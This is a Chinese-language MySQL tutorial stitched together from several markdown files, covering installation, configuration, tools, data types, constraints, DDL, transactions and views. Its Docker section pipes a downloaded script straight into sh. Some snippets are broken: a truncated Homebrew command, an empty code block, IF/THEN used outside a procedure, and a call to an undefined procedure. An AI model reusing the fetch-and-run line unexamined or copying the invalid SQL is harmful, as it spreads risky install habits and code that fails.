1. **下载安装包**：从 [MySQL 官网](https://dev.mysql.com/downloads/installer/) 下载 MySQL Installer
2. **运行安装程序**：

- 选择 "Developer Default" 适合开发环境（包含 MySQL Server、Workbench、Visual Studio 插件等）
- 选择 "Server Only" 适合生产环境
- 选择 "Custom" 可自定义选择组件

3. **配置 MySQL**：

```text
 - 设置 root 密码（务必设置强密码）
 - 配置端口（默认 3306，建议在有冲突时修改）
 - 选择服务启动方式（自动启动/手动启动）
 - 配置高级选项（日志文件路径、字符集等）
```

4. **完成安装**：按照向导完成安装和配置
5. **验证安装**：

```cmd
 # 打开命令提示符
 mysql -u root -p
 # 查看版本
 mysql --version
```

### 3.2 使用压缩包手动安装

1. **下载压缩包**：从官网下载 mysql-8.4.x-winx64.zip
2. **解压到指定目录**：如 `C:\mysql`
3. **创建配置文件** `my.ini`：

```ini
 [mysqld]
 # 设置端口
 port=3306
 # 设置安装目录
 basedir=C:\mysql
 # 设置数据目录
 datadir=C:\mysql\data
 # 字符集
 character-set-server=utf8mb4
 collation-server=utf8mb4_unicode_ci
 [client]
 port=3306
```

4. **初始化数据库**：

```cmd
 cd C:\mysql\bin
 mysqld --initialize --console
```

5. **安装服务**：

```cmd
 mysqld --install MySQL --defaults-file=C:\mysql\my.ini
```

6. **启动服务**：

```cmd
 net start MySQL
```

## 4. Linux 安装

### 4.1 Ubuntu/Debian 安装

```bash
 # 更新包列表
 sudo apt update
 # 安装 MySQL 服务器
 sudo apt install mysql-server -y
 # 安全配置（设置 root 密码、移除匿名用户等）
 sudo mysql_secure_installation
 # 启动服务
 sudo systemctl start mysql
 sudo systemctl enable mysql
 # 检查服务状态
 sudo systemctl status mysql
 # 验证安装
 sudo mysql -u root
```

### 4.2 CentOS/RHEL 安装

```bash
 # 安装 MySQL 仓库
 sudo yum install -y https://dev.mysql.com/get/mysql80-community-release-el7-3.noarch.rpm
 # 安装 MySQL 服务器
 sudo yum install -y mysql-community-server
 # 启动服务
 sudo systemctl start mysqld
 sudo systemctl enable mysqld
 # 获取临时密码
 sudo grep 'temporary password' /var/log/mysqld.log
 # 安全配置
 sudo mysql_secure_installation
 # 验证安装
 mysql -u root -p
```

### 4.3 Docker 方式（各 Linux 通用）

```bash
 # 安装 Docker（如果未安装）
 curl -fsSL https://get.docker.com | sh
 # 拉取并运行 MySQL
 docker run -d \
  --name mysql \
  -e MYSQL_ROOT_PASSWORD=your_password \
  -p 3306:3306 \
  -v /opt/mysql/data:/var/lib/mysql \
  mysql:8.4
```

## 5. macOS 安装

### 5.1 使用 Homebrew 安装

```bash
 # 如果未安装 Homebrew，先安装
 /
 # 更新 Homebrew
 brew update
 # 安装 MySQL
 brew install mysql
 # 启动 MySQL 服务
 brew services start mysql
 # 安全配置
 mysql_secure_installation
 # 连接 MySQL
 mysql -u root
```

### 5.2 使用 DMG 安装包

1. 从 [MySQL 官网](https://dev.mysql.com/downloads/mysql/) 下载 macOS DMG 安装包
2. 双击打开 DMG 文件
3. 运行 MySQL 安装程序
4. 完成安装向导
5. 通过系统偏好设置启动 MySQL

## 6. 环境变量配置

### 6.1 Windows 配置

1. 右键 "此电脑" → "属性" → "高级系统设置" → "环境变量"
2. 在 "系统变量" 中找到 "Path"，点击 "编辑"
3. 添加 MySQL 安装目录的 bin 文件夹路径：

- 如果使用 MySQL Installer：`C:\Program Files\MySQL\MySQL Server 8.4\bin`
- 如果使用压缩包：`C:\mysql\bin`

4. 点击 "确定" 保存配置
5. 重启命令行窗口使配置生效
6. 验证配置：

```cmd
 mysql --version
```

### 6.2 Linux/macOS 配置

```bash
 # 编辑环境变量文件
 sudo nano /etc/profile # 全局配置
 # 或
 nano ~/.bashrc # 用户级配置
 # 在文件末尾添加（根据实际安装路径）
 export PATH=$PATH:/usr/bin/mysql
 # 或
 export PATH=$PATH:/usr/local/mysql/bin
 # 使配置生效
 source /etc/profile # 全局配置
 # 或
 source ~/.bashrc # 用户级配置
 # 验证配置
 mysql --version
```

## 7. MySQL 配置文件详解

### 7.1 配置文件位置

| 操作系统 | 配置文件位置                              |
| :------- | :---------------------------------------- |
| Windows  | `my.ini`（MySQL 安装目录或 `C:\Windows`） |
| Linux    | `/etc/mysql/my.cnf` 或 `/etc/my.cnf`      |
| macOS    | `/usr/local/etc/my.cnf` 或 `~/.my.cnf`    |

### 7.2 配置文件结构

```ini
 [mysqld] # 服务器端配置
 port=3306
 basedir=/usr/local/mysql
 datadir=/var/lib/mysql
 character-set-server=utf8mb4
 collation-server=utf8mb4_unicode_ci
 max_connections=200
 [mysql] # 客户端配置
 default-character-set=utf8mb4
 [client] # 客户端连接配置
 port=3306
 host=localhost
```

### 7.3 常用配置参数

```ini
 [mysqld]
 # 基础配置
 port=3306
 bind-address=0.0.0.0
 # 字符集配置
 character-set-server=utf8mb4
 collation-server=utf8mb4_unicode_ci
 # InnoDB 配置
 innodb_buffer_pool_size=1G # 建议为服务器内存的 70-80%
 innodb_log_file_size=256M
 innodb_flush_log_at_trx_commit=1
 # 连接配置
 max_connections=200
 wait_timeout=600
 interactive_timeout=600
 # 日志配置
 slow_query_log=1
 slow_query_log_file=/var/log/mysql/slow.log
 long_query_time=2
 # 字符集
 character-set-server=utf8mb4
```

## 8. 管理工具

### 8.1 命令行工具详解

| 工具            | 功能             | 使用示例                                            |
| :-------------- | :--------------- | :-------------------------------------------------- |
| **mysql**       | 官方命令行客户端 | `mysql -u root -p`                                  |
| **mysqldump**   | 数据备份工具     | `mysqldump -u root -p database_name > backup.sql`   |
| **mysqladmin**  | 管理工具         | `mysqladmin -u root -p status`                      |
| **mysqlimport** | 数据导入工具     | `mysqlimport -u root -p database_name data.txt`     |
| **mysqld**      | MySQL 服务器进程 | `mysqld --defaults-file=/etc/my.cnf`                |
| **mysqlcheck**  | 检查表和修复     | `mysqlcheck -u root -p --auto-repair database_name` |
| **mysqlbinlog** | 查看二进制日志   | `mysqlbinlog mysql-bin.000001`                      |

### 8.2 mysqldump 备份示例

```bash
 # 备份单个数据库
 mysqldump -u root -p database_name > backup.sql
 # 备份多个数据库
 mysqldump -u root -p --databases db1 db2 > backup.sql
 # 备份所有数据库
 mysqldump -u root -p --all-databases > all_databases_backup.sql
 # 备份表结构（不包含数据）
 mysqldump -u root -p --no-data database_name > structure_only.sql
 # 备份数据（不包含表结构）
 mysqldump -u root -p --no-create-info database_name > data_only.sql
 # 压缩备份
 mysqldump -u root -p database_name | gzip > backup.sql.gz
 # 恢复数据库
 mysql -u root -p database_name < backup.sql
```

### 8.3 GUI 工具对比

| 工具                | 特点                                        | 适用场景                   | 价格 |
| :------------------ | :------------------------------------------ | :------------------------- | :--- |
| **MySQL Workbench** | 官方 GUI 工具，EER建模、SQL开发、服务器管理 | 开发、管理、设计数据库     | 免费 |
| **DBeaver**         | 开源跨平台，支持多种数据库，社区活跃        | 多数据库管理、SQL 开发     | 免费 |
| **Navicat**         | 商业工具，界面友好，功能强大，性能优秀      | 企业级数据库管理           | 付费 |
| **phpMyAdmin**      | Web 界面，适合远程管理，无需安装客户端      | 远程管理、简单操作         | 免费 |
| **HeidiSQL**        | 轻量级 Windows 工具，开源                   | Windows 环境下的数据库管理 | 免费 |
| **Sequel Pro**      | macOS 专用工具，轻量快速                    | macOS 环境下的数据库管理   | 免费 |
| **DataGrip**        | JetBrains 出品，强大的数据库 IDE            | 专业开发、复杂查询         | 付费 |

<!-- ============ 文档分隔线：020-mysql/007-MySQLDataTypeConstraint.md ============ -->

## 1. 数据类型选择原则 (Selection Principles)

核心目标：

- 正确表达业务含义（语义清晰）
- 保证数据完整性（约束与校验）
- 兼顾性能与存储成本（索引友好、空间可控）
  实践要点：
- 能用更小的类型就不用更大类型（但不要牺牲语义）
- 经常参与过滤/排序/Join 的列优先选择“可索引且稳定”的类型
- 避免把结构化字段塞进一个字符串里（除非确实是原始文本）

## 2. 数值类型 (Numeric)

### 2.1 整数

常用：`TINYINT`、`INT`、`BIGINT`
实践建议：

- 业务自增主键常用 `BIGINT`（预留增长空间）
- 状态枚举常用 `TINYINT`（配合业务层枚举）
- 需要非负时用 `UNSIGNED`

### 2.2 定点与浮点

- 金额优先用 `DECIMAL(p, s)`，避免浮点误差
- 测量数据/近似值可用 `DOUBLE`

## 3. 字符串类型 (String)

### 3.1 `CHAR` vs `VARCHAR`

- `CHAR(n)`：定长，适合长度固定的值（如国家码、短编码），更新更稳定
- `VARCHAR(n)`：变长，适合长度变化较大的值（如昵称、标题）
  实践建议：
- `VARCHAR` 不是越大越好，过大的上限会影响行格式与索引策略
- 经常参与索引的长文本字段慎用 `VARCHAR(1024+)`

### 3.2 `TEXT` 家族

用于长文本（文章内容、描述）。注意：

- `TEXT` 列通常不适合直接做常规索引（需要前缀索引或全文索引）
- `TEXT` 列会影响行存储与读取代价

## 4. 日期与时间 (Date & Time)

常用：`DATE`、`DATETIME`、`TIMESTAMP`

- `DATETIME`：范围大，存储不依赖时区转换（更“客观”）
- `TIMESTAMP`：存储与时区有关（读取/写入可能发生转换），范围较小
  实践建议：
- 业务“发生时间”通常用 `DATETIME`，统一用 UTC 或在应用层明确时区策略
- 保存“仅日期”用 `DATE`，避免在应用层反复截断

## 5. JSON 类型 (JSON)

MySQL 的 `JSON` 适合存放：

- 结构频繁变化的扩展字段
- 不适合拆表但需要一定结构的配置项
  注意：
- JSON 查询需要函数/生成列配合索引，否则易慢
- 不要用 JSON 替代关键业务字段（关键字段应拆列以便约束、索引与统计）

## 6. 字符集与排序规则 (Charset & Collation)

实践建议：

- 统一使用 `utf8mb4`
- 明确排序规则（collation），避免跨表/跨库比较时发生隐式转换

## 7. 约束 (Constraints)

### 7.1 `NOT NULL`

优先用 `NOT NULL` 来表达“必填”。配合默认值要谨慎，确保默认值也符合业务语义。

### 7.2 `DEFAULT`

示例：

```sql
 created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP
```

注意：不要用默认值掩盖业务层输入缺失，应区分“未知/未填”与“默认”。

### 7.3 `UNIQUE`

用于业务唯一性约束（如手机号、邮箱、业务单号）。
实践建议：

- 唯一约束应该从业务语义出发，而不是“为了查得快”
- 可组合唯一：例如 `(tenant_id, email)`

### 7.4 `PRIMARY KEY`

通常建议：

- 使用单列自增或雪花 ID 作为主键
- 避免使用可变业务字段（例如手机号）作为主键

### 7.5 `FOREIGN KEY`

MySQL 支持外键，但很多互联网业务会选择在应用层维护约束，原因包括：

- 高并发下跨表约束可能放大锁冲突
- 分库分表/异构存储下外键不可用
  是否使用外键取决于：
- 业务规模与一致性要求
- 团队治理与数据质量策略

## 8. 建表示例 (Example)

```sql
 CREATE TABLE user_account (
  id BIGINT UNSIGNED NOT NULL PRIMARY KEY,
  email VARCHAR(255) NOT NULL,
  status TINYINT NOT NULL DEFAULT 1,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  UNIQUE KEY uk_email (email)
 )
```

---

## 数值类型

**单行写法：定义 BIGINT 自增主键**
`<列名> BIGINT [UNSIGNED] [NOT NULL] [PRIMARY KEY] [AUTO_INCREMENT]`
```sql
-- 定义 BIGINT 无符号自增主键
id BIGINT UNSIGNED NOT NULL PRIMARY KEY AUTO_INCREMENT;
```

**单行写法：定义 TINYINT 状态枚举**
`<列名> TINYINT [UNSIGNED] [NOT NULL] [DEFAULT <默认值>]`
```sql
-- 定义 TINYINT 状态字段并设置默认值
status TINYINT NOT NULL DEFAULT 1;
```

**单行写法：定义 DECIMAL 金额字段**
`<列名> DECIMAL(<精度>, <小数位数>) [DEFAULT <默认值>]`
```sql
-- 定义金额字段避免浮点误差
balance DECIMAL(10, 2) DEFAULT 0.00;
```

**单行写法：定义 DOUBLE 浮点字段**
`<列名> <FLOAT|DOUBLE> [(<精度>, <小数位数>)]`
```sql
-- 定义测量数据浮点字段
temperature DOUBLE;
```

---

## 字符串类型

**单行写法：定义 CHAR 定长字符串**
`<列名> CHAR(<长度>) [NOT NULL]`
```sql
-- 定义国家码定长字段
country_code CHAR(2) NOT NULL;
```

**单行写法：定义 VARCHAR 变长字符串**
`<列名> VARCHAR(<最大长度>) [NOT NULL]`
```sql
-- 定义用户名变长字段
username VARCHAR(50) NOT NULL;
```

**单行写法：定义 TEXT 长文本**
`<列名> <TINYTEXT|TEXT|MEDIUMTEXT|LONGTEXT>`
```sql
-- 定义文章内容长文本字段
content TEXT;
```

---

## 日期与时间类型

**单行写法：定义 DATE 日期字段**
`<列名> DATE`
```sql
-- 定义仅保存日期的字段
birthday DATE;
```

**单行写法：定义 DATETIME 日期时间字段**
`<列名> DATETIME [NOT NULL] [DEFAULT CURRENT_TIMESTAMP]`
```sql
-- 定义业务发生时间字段
created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP;
```

**单行写法：定义 TIMESTAMP 自动更新字段**
`<列名> TIMESTAMP [DEFAULT CURRENT_TIMESTAMP] [ON UPDATE CURRENT_TIMESTAMP]`
```sql
-- 定义更新时间自动维护字段
updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP;
```

---

## JSON 类型

**单行写法：定义 JSON 列**
`<列名> JSON`
```sql
-- 定义 JSON 扩展字段
profile JSON;
```

**换行写法：建表时包含 JSON 列**
`CREATE TABLE <表名> (<列定义>, <JSON 列名> JSON)`
```sql
-- 创建包含 JSON 字段的用户表
CREATE TABLE users (
  id BIGINT UNSIGNED NOT NULL PRIMARY KEY,
  profile JSON
);
```

---

## 字符集与排序规则

**换行写法：创建数据库时指定字符集**
`CREATE DATABASE <库名> CHARACTER SET <字符集> COLLATE <排序规则>`
```sql
-- 创建数据库并指定 utf8mb4 字符集
CREATE DATABASE mydb
  CHARACTER SET utf8mb4
  COLLATE utf8mb4_unicode_ci;
```

---

## 约束

**单行写法：非空约束**
`<列名> <类型> NOT NULL`
```sql
-- 定义必填字段
email VARCHAR(255) NOT NULL;
```

**单行写法：默认值约束**
`<列名> <类型> DEFAULT <默认值>`
```sql
-- 定义状态字段默认值为 1
status TINYINT NOT NULL DEFAULT 1;
```

**单行写法：默认值为当前时间**
`<列名> <时间类型> DEFAULT CURRENT_TIMESTAMP`
```sql
-- 定义创建时间默认值为当前时间
created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP;
```

**单行写法：单列唯一约束**
`UNIQUE [KEY <索引名>] (<列名>)`
```sql
-- 定义邮箱单列唯一约束
UNIQUE KEY uk_email (email);
```

**单行写法：组合唯一约束**
`UNIQUE [KEY <索引名>] (<列名1>, <列名2>[, ...])`
```sql
-- 定义租户与邮箱组合唯一约束
UNIQUE KEY uk_tenant_email (tenant_id, email);
```

**单行写法：单列主键约束**
`<列名> <类型> PRIMARY KEY`
```sql
-- 定义单列主键
id BIGINT UNSIGNED NOT NULL PRIMARY KEY;
```

**单行写法：复合主键约束**
`PRIMARY KEY (<列名1>, <列名2>[, ...])`
```sql
-- 定义复合主键
PRIMARY KEY (tenant_id, user_id);
```

**换行写法：外键约束**
`FOREIGN KEY (<列名>) REFERENCES <父表>(<父列>) [ON DELETE <行为>] [ON UPDATE <行为>]`
```sql
-- 定义外键关联并设置级联行为
FOREIGN KEY (user_id) REFERENCES users(id)
  ON DELETE RESTRICT
  ON UPDATE CASCADE;
```

**单行写法：检查约束（非负）**
`CHECK (<条件表达式>)`
```sql
-- 定义金额必须非负的检查约束
CHECK (total_amount >= 0);
```

**单行写法：检查约束（枚举值）**
`CHECK (<列名> IN (<值1>, <值2>[, ...]))`
```sql
-- 定义状态值限定检查约束
CHECK (status IN (1, 2, 3, 4, 5));
```

**单行写法：自增约束**
`<列名> <整数类型> AUTO_INCREMENT`
```sql
-- 定义自增主键
id INT PRIMARY KEY AUTO_INCREMENT;
```

---

## 建表示例

**换行写法：完整建表语句**
`CREATE TABLE <表名> (<列定义>[, <约束定义>...])`
```sql
-- 创建用户账户表并包含唯一约束
CREATE TABLE user_account (
  id BIGINT UNSIGNED NOT NULL PRIMARY KEY,
  email VARCHAR(255) NOT NULL,
  status TINYINT NOT NULL DEFAULT 1,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  UNIQUE KEY uk_email (email)
);
```

<!-- ============ 文档分隔线：020-mysql/008-SQLDataDefinitionAdvanced.md ============ -->

## 1. DDL (数据定义语言) - Data Definition Language

DDL 用于创建、修改和删除数据库对象，包括数据库、表、索引、视图等。

> **新手必读：DDL 会自动提交，无法回滚**
> DDL 语句执行后立即生效，MySQL 会对其隐式提交，**不能像 DML 那样用 `ROLLBACK` 撤销**。
> 执行 `DROP` / `TRUNCATE` / `ALTER` 前务必再三确认作用对象与影响范围，删表、清表操作没有后悔药。

**DDL 核心命令一览**：

| 命令 | 作用 | 类比 | 可回滚 |
| --- | --- | --- | --- |
| `CREATE` | 创建数据库、表、索引、视图 | 平地起楼、画图纸 | 否 |
| `ALTER` | 修改表结构（加列、改类型、删列） | 给楼扩建或改装修 | 否 |
| `DROP` | 删除表/数据库，结构与数据一并消失 | 直接炸掉整栋楼 | 否 |
| `TRUNCATE` | 清空表数据但保留表结构，自增 ID 重置 | 扔光屋里东西、墙留着 | 否 |

### 1.1 数据库操作详解

#### 1.1.1 创建数据库

```sql
 CREATE DATABASE mydb;
 CREATE DATABASE mydb
  CHARACTER SET utf8mb4
  COLLATE utf8mb4_unicode_ci;
 CREATE DATABASE IF NOT EXISTS mydb
  CHARACTER SET utf8mb4
  COLLATE utf8mb4_unicode_ci;
```

#### 1.1.2 查看数据库

```sql
 SHOW DATABASES;
 SHOW CREATE DATABASE mydb;
 SELECT DATABASE();
```

#### 1.1.3 选择数据库

```sql
 use mydb;
```

#### 1.1.4 删除数据库

```sql
 DROP DATABASE mydb;
 DROP DATABASE IF EXISTS mydb;
```

#### 1.1.5 修改数据库

```sql
 ALTER DATABASE mydb CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
```

### 1.2 表操作详解

#### 1.2.1 创建表

```sql
 CREATE TABLE users (
  id INT PRIMARY KEY AUTO_INCREMENT COMMENT '用户ID',
  username VARCHAR(50) NOT NULL UNIQUE COMMENT '用户名',
  email VARCHAR(100) NOT NULL COMMENT '邮箱',
  password VARCHAR(255) NOT NULL COMMENT '密码（加密存储）',
  phone VARCHAR(20) COMMENT '手机号',
  age INT UNSIGNED COMMENT '年龄',
  gender ENUM('男', '女', '保密') DEFAULT '保密' COMMENT '性别',
  avatar VARCHAR(255) COMMENT '头像URL',
  status TINYINT DEFAULT 1 COMMENT '状态：1-正常，0-禁用',
  balance DECIMAL(10,2) DEFAULT 0.00 COMMENT '账户余额',
  last_login_time DATETIME COMMENT '最后登录时间',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP COMMENT '更新时间',
  INDEX idx_username (username),
  INDEX idx_email (email),
  INDEX idx_status (status)
 )
```

#### 1.2.2 表结构设计原则

**设计要点**：

- 主键：每个表必须有主键，推荐使用自增 INT 或 BIGINT
- 字段命名：使用有意义的名称，采用小写下划线命名法
- 数据类型：选择合适的数据类型，避免浪费存储空间
- 索引设计：为常用查询条件的字段创建索引
- 注释：为重要字段添加注释说明
  **字段类型选择指南**：
  | 场景      | 推荐类型                  | 原因                     |
  | :-------- | :------------------------ | :----------------------- |
  | ID 主键   | INT/BIGINT AUTO_INCREMENT | 高效、自增、占用空间小   |
  | 状态标志  | TINYINT                   | 占用空间最小             |
  | 年龄      | TINYINT UNSIGNED          | 范围 0-255，足够存储年龄 |
  | 金额/价格 | DECIMAL(M,N)              | 精确存储，避免浮点误差   |
  | 手机号    | VARCHAR(20)               | 可能有+86等前缀          |
  | 文本描述  | VARCHAR/TEXT              | 根据长度选择             |
  | 日期时间  | DATETIME/TIMESTAMP        | 根据是否需要时区选择     |
  | UUID      | VARCHAR(36)               | 跨系统使用               |

#### 1.2.3 查看表结构

```sql
 DESC users;
 SHOW COLUMNS FROM users;
 SHOW CREATE TABLE users;
 SHOW TABLES;
 SHOW TABLE STATUS FROM mydb;
 SHOW TABLES LIKE '%user%';
```

#### 1.2.4 修改表结构

```sql
 ALTER TABLE users ADD COLUMN address VARCHAR(255) AFTER email;
 ALTER TABLE users ADD COLUMN is_verified TINYINT DEFAULT 0 AFTER status;
 ALTER TABLE users MODIFY COLUMN phone VARCHAR(20) NOT NULL;
 ALTER TABLE users CHANGE COLUMN phone telephone VARCHAR(20) NOT NULL;
 ALTER TABLE users DROP COLUMN address;
 ALTER TABLE users ADD INDEX idx_age (age);
 ALTER TABLE users ADD UNIQUE INDEX idx_phone (phone);
 ALTER TABLE users ADD INDEX idx_age_gender (age, gender);
 ALTER TABLE orders ADD CONSTRAINT fk_user_id FOREIGN KEY (user_id) REFERENCES users(id);
 ALTER TABLE orders DROP FOREIGN KEY fk_user_id;
 ALTER TABLE users COMMENT '用户信息表';
 ALTER TABLE users RENAME TO user_info;
 RENAME TABLE users TO user_info, orders TO order_info;
```

#### 1.2.5 删除表

```sql
 DROP TABLE users;
 DROP TABLE IF EXISTS users;
 DROP TABLE IF EXISTS users, orders, products;
 TRUNCATE TABLE users;
```

#### 1.2.6 表复制

```sql
 CREATE TABLE users_copy LIKE users;
 CREATE TABLE users_copy AS SELECT * FROM users;
 CREATE TABLE users_copy AS SELECT id, username, email FROM users WHERE 1=0;
 CREATE TABLE users_copy AS SELECT * FROM users WHERE status = 1;
```

### 1.3 索引操作详解

#### 1.3.1 索引基础概念

索引是一种特殊的数据结构，用于加速数据检索。类似于书籍的目录，索引可以快速定位数据，减少查询时间。
**索引类型**：

| 类型     | 说明         | 示例                                   |
| :------- | :----------- | :------------------------------------- |
| 普通索引 | 最基本的索引 | `INDEX idx_name (name)`                |
| 唯一索引 | 索引值唯一   | `UNIQUE INDEX idx_email (email)`       |
| 主键索引 | 主键自动创建 | 主键列                                 |
| 复合索引 | 多列组合索引 | `INDEX idx_name_age (name, age)`       |
| 全文索引 | 文本搜索     | `FULLTEXT INDEX ft_content (content)`  |
| 空间索引 | 地理空间数据 | `SPATIAL INDEX sx_location (location)` |

#### 1.3.2 创建索引

```sql
 CREATE INDEX idx_username ON users(username);
 CREATE UNIQUE INDEX idx_email ON users(email);
 CREATE INDEX idx_name_status ON users(username, status);
 CREATE UNIQUE INDEX idx_order_product ON order_items(order_id, product_id);
 ALTER TABLE articles ADD FULLTEXT INDEX ft_title_content (title, content);
 CREATE INDEX idx_email_prefix ON users(email(10));
```

#### 1.3.3 查看索引

```sql
 SHOW INDEX FROM users;
 SHOW INDEX FROM users\G
 EXPLAIN SELECT * FROM users WHERE username = 'test';
```

#### 1.3.4 删除索引

```sql
 DROP INDEX idx_username ON users;
 ALTER TABLE users MODIFY id INT NOT NULL;
 ALTER TABLE users DROP PRIMARY KEY;
```

#### 1.3.5 索引设计原则

**适合创建索引的场景**：

- WHERE 子句中经常使用的列
- JOIN 操作中经常使用的列
- ORDER BY、GROUP BY 后面的列
- SELECT 中频繁查询的列
  **不适合创建索引的场景**：
- 列中数据重复度很高（如性别只有男/女）
- 表数据量很小
- 经常更新的列
- 不出现在 WHERE 子句中的列
  **复合索引最左前缀原则**：

```sql
 CREATE INDEX idx_status_created ON users(status, created_at);
 SELECT * FROM users WHERE status = 1;
 SELECT * FROM users WHERE status = 1 AND created_at > '2024-01-01';
 SELECT * FROM users WHERE created_at > '2024-01-01';
```

### 1.4 约束详解

#### 1.4.1 约束类型

| 约束类型 | 说明             | 关键字         |
| :------- | :--------------- | :------------- |
| 主键约束 | 唯一标识每行记录 | PRIMARY KEY    |
| 唯一约束 | 字段值唯一       | UNIQUE         |
| 非空约束 | 字段值不能为空   | NOT NULL       |
| 默认约束 | 字段默认值       | DEFAULT        |
| 检查约束 | 字段值满足条件   | CHECK          |
| 外键约束 | 表之间关联       | FOREIGN KEY    |
| 自动增长 | 数值自动递增     | AUTO_INCREMENT |

#### 1.4.2 约束示例

```sql
 CREATE TABLE orders (
  id INT PRIMARY KEY AUTO_INCREMENT,
  order_no VARCHAR(32) NOT NULL UNIQUE COMMENT '订单编号',
  user_id INT NOT NULL COMMENT '用户ID',
  total_amount DECIMAL(10,2) NOT NULL DEFAULT 0.00 COMMENT '订单总额',
  status TINYINT NOT NULL DEFAULT 1 COMMENT '状态',
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  -- 外键约束
  FOREIGN KEY (user_id) REFERENCES users(id)
  ON DELETE RESTRICT -- 限制删除
  ON UPDATE CASCADE, -- 级联更新
  -- 检查约束
  CHECK (total_amount >= 0),
  CHECK (status IN (1, 2, 3, 4, 5))
 )
```

#### 1.4.3 外键约束行为

| 行为      | 说明                              |
| :-------- | :-------------------------------- |
| RESTRICT  | 阻止删除/更新有外键关联的记录     |
| CASCADE   | 级联删除/更新子表记录             |
| SET NULL  | 将子表外键设为 NULL               |
| NO ACTION | 拒绝删除/更新（与 RESTRICT 类似） |

## 2. 事务详解

### 2.1 事务概念

事务是指一组操作，这些操作要么全部成功，要么全部失败，是一个不可分割的工作单元。
**ACID 特性**：

- Atomicity（原子性）：事务是最小执行单元，不可分割
- Consistency（一致性）：事务执行前后，数据保持一致
- Isolation（隔离性）：并发执行的事务相互隔离
- Durability（持久性）：事务提交后，修改永久保存

### 2.2 事务基本语法

```sql
 START TRANSACTION;
 BEGIN;
 inSERT INTO users (username, email) VALUES ('张三', 'zhangsan@example.com');
 UPDATE accounts SET balance = balance - 100 WHERE user_id = 1;
 UPDATE accounts SET balance = balance + 100 WHERE user_id = 2;
 commit;
 ROLLBACK;
 START TRANSACTION;
 inSERT INTO users (username) VALUES ('张三');
 SAVEPOINT sp1;
 inSERT INTO users (username) VALUES ('李四');
 ROLLBACK TO sp1; -- 回滚到保存点
 commit;
```

### 2.3 事务隔离级别

| 隔离级别               | 脏读   | 不可重复读 | 幻读   |
| :--------------------- | :----- | :--------- | :----- |
| READ UNCOMMITTED       | 可能   | 可能       | 可能   |
| READ COMMITTED         | 不可能 | 可能       | 可能   |
| REPEATABLE READ (默认) | 不可能 | 不可能     | 可能   |
| SERIALIZABLE           | 不可能 | 不可能     | 不可能 |

```sql
 SELECT @@tx_isolation;
 SELECT @@transaction_isolation;
 SET SESSION TRANSACTION ISOLATION LEVEL READ COMMITTED;
 SET GLOBAL TRANSACTION ISOLATION LEVEL SERIALIZABLE;
```

### 2.4 事务实战

```sql
 START TRANSACTION;
 UPDATE accounts SET balance = balance - 1000 WHERE user_id = 1;
 UPDATE accounts SET balance = balance + 1000 WHERE user_id = 2;
 SELECT balance FROM accounts WHERE user_id IN (1, 2);
 if (SELECT balance FROM accounts WHERE user_id = 1) < 0 THEN
  ROLLBACK;
 else
  COMMIT;
 END IF;
 START TRANSACTION;
 inSERT INTO orders (user_id, total_amount) VALUES (1, 500);
 SET @order_id = LAST_INSERT_ID();
 inSERT INTO order_items (order_id, product_id, quantity, price) VALUES
 (@order_id, 101, 2, 200),
 (@order_id, 102, 1, 100);
 UPDATE products SET stock = stock - 3 WHERE id IN (101, 102);
 commit;
```

## 3. 视图详解

### 3.1 视图概念

视图是基于 SQL 查询结果的虚拟表，可以简化复杂查询、保护数据安全。

### 3.2 创建视图

```sql
 CREATE VIEW active_users AS
 SELECT id, username, email, status
 from users
 WHERE status = 1;
 CREATE VIEW order_details AS
 SELECT
  o.id AS order_id,
  o.order_no,
  u.username,
  u.email,
  o.total_amount,
  o.status,
  o.created_at
 from orders o
 inNER JOIN users u ON o.user_id = u.id;
 CREATE VIEW user_stats AS
 SELECT
  u.id,
  u.username,
  COUNT(o.id) AS order_count,
  IFNULL(SUM(o.total_amount), 0) AS total_spent,
  MAX(o.created_at) AS last_order_time
 from users u
 LEFT JOIN orders o ON u.id = o.user_id
 GROUP BY u.id, u.username;
```

### 3.3 使用视图

```sql
 SELECT * FROM active_users WHERE username LIKE '张%';
 SELECT v.username, v.order_count, o.order_no
 from user_stats v
 LEFT JOIN orders o ON v.id = o.user_id
 WHERE o.created_at > '2024-01-01';
 CREATE TABLE monthly_sales AS
 SELECT
  DATE_FORMAT(created_at, '%Y-%m') AS month,
  COUNT(*) AS order_count,
  SUM(total_amount) AS total_amount
 from orders
 GROUP BY DATE_FORMAT(created_at, '%Y-%m');
```

### 3.4 修改和删除视图

```sql
 CREATE OR REPLACE VIEW active_users AS
 SELECT id, username, email, status, created_at
 from users
 WHERE status = 1;
 DROP VIEW IF EXISTS active_users;
 SHOW CREATE VIEW order_details;
```

### 3.5 视图限制

```sql
```

## 4. 存储过程详解

### 4.1 存储过程概念

存储过程是预编译的 SQL 代码块，可以接收参数、返回值，用于实现复杂的业务逻辑。

### 4.2 创建存储过程

```sql
 DELIMITER //
 CREATE PROCEDURE get_user_by_age(IN min_age INT, IN max_age INT)
 BEGIN
  SELECT * FROM users
  WHERE age BETWEEN min_age AND max_age
  ORDER BY age;
 END //
 CREATE PROCEDURE count_users_by_status(OUT active_count INT, OUT inactive_count INT)
 BEGIN
  SELECT COUNT(*) INTO active_count FROM users WHERE status = 1;
  SELECT COUNT(*) INTO inactive_count FROM users WHERE status = 0;
 END //
 CREATE PROCEDURE update_user_status(IN user_id INT, IN new_status INT)
 BEGIN
  UPDATE users SET status = new_status, updated_at = NOW() WHERE id = user_id;
 END //
 DELIMITER ;
```

### 4.3 调用存储过程

```sql
 CALL get_all_users();
 CALL get_user_by_age(20, 30);
 CALL count_users_by_status(@active, @inactive);
 SELECT @active AS active_users, @inactive AS inactive_users;
 SET @user_id = 1;
 CALL update_user_status(@user_id, 0);
```

### 4.4 删除存储过程

```sql
 DROP PROCEDURE IF EXISTS get_user_by_age;
```

## 5. 触发器详解

### 5.1 触发器概念

触发器是在表发生特定事件（INSERT、UPDATE、DELETE）时自动执行的代码块。

